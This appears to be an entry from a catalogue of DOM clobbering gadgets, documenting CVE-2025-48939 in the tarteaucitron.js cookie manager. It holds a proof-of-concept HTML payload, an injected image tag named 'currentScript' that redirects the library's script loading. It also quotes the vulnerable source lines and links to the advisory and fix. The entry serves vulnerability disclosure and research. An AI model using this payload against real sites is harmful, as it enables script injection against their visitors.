---
description: 👋 Hey, I'm Amauri, a french dev that build a GDPR friendly cookie manager. tarteaucitron was initially a simple script for my personal blog (in 2013), a few months later, the Github repository is opened and tarteaucitron is now reliable and recognized.
github: AmauriC/tarteaucitron.js
gadgets:
  ≤v1.21.0:
    cve: CVE-2025-48939
    authors:
      - github:Rudloff
    tags:
      - chrome-browser
      - safari-browser
      - img-tag
      - name-attr
      - src-attr
      - before-func-call
    pocs:
      - description: The [tarteaucitron.js](https://github.com/AmauriC/tarteaucitron.js) library was using the `document.currentScript` property to load scripts.
        code: |
          <!-- user input -->
          <img name="currentScript" src="[current-location]/assets/xss/index.js">

          <script src="https://cdnjs.cloudflare.com/ajax/libs/tarteaucitronjs/1.21.0/tarteaucitron.js"></script>
          <script>
            tarteaucitron.init({});
          </script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/AmauriC/tarteaucitron.js/blob/42504c4a690352bb86cbae7100d78629208ec399/tarteaucitron.js#L4">https://github.com/AmauriC/tarteaucitron.js/blob/42504c4a690352bb86cbae7100d78629208ec399/tarteaucitron.js#L4</a>

      ```javascript
      var scripts = document.getElementsByTagName('script'),
        tarteaucitronPath = (document.currentScript || scripts[scripts.length - 1]).src.split('?')[0],
        tarteaucitronForceCDN = (tarteaucitronForceCDN === undefined) ? '' : tarteaucitronForceCDN,
        tarteaucitronUseMin = (tarteaucitronUseMin === undefined) ? '' : tarteaucitronUseMin,
        cdn = (tarteaucitronForceCDN === '') ? tarteaucitronPath.split('/').slice(0, -1).join('/') + '/' : tarteaucitronForceCDN,
        alreadyLaunch = (alreadyLaunch === undefined) ? 0 : alreadyLaunch,
        tarteaucitronForceLanguage = (tarteaucitronForceLanguage === undefined) ? '' : tarteaucitronForceLanguage,
        tarteaucitronForceExpire = (tarteaucitronForceExpire === undefined) ? '' : tarteaucitronForceExpire,
        tarteaucitronCustomText = (tarteaucitronCustomText === undefined) ? '' : tarteaucitronCustomText,
        // tarteaucitronExpireInDay: true for day(s) value - false for hour(s) value
        tarteaucitronExpireInDay = (tarteaucitronExpireInDay === undefined || typeof tarteaucitronExpireInDay !== "boolean") ? true : tarteaucitronExpireInDay,
        timeExpire = 31536000000,
        tarteaucitronProLoadServices,
        tarteaucitronNoAdBlocker = false,
        tarteaucitronIsLoaded = false;
      ```

      Source: <a target="_blank" href="https://github.com/AmauriC/tarteaucitron.js/blob/42504c4a690352bb86cbae7100d78629208ec399/tarteaucitron.js#L483">https://github.com/AmauriC/tarteaucitron.js/blob/42504c4a690352bb86cbae7100d78629208ec399/tarteaucitron.js#L483</a>

      ```javascript
        // Step 1: load css
        if ( !tarteaucitron.parameters.useExternalCss ) {
            linkElement.rel = 'stylesheet';
            linkElement.type = 'text/css';
            linkElement.href = cdn + 'css/tarteaucitron' + (useMinifiedJS ? '.min' : '') + '.css';
            document.getElementsByTagName('head')[0].appendChild(linkElement);
        }

        // Step 2: load language and services
        tarteaucitron.addInternalScript(pathToLang, '', function () {
      ```
    links:
      - https://github.com/advisories/GHSA-q43x-79jr-cq98
      - https://github.com/AmauriC/tarteaucitron.js/commit/230a3b69d363837acfa895823d841e0608826ba3
---
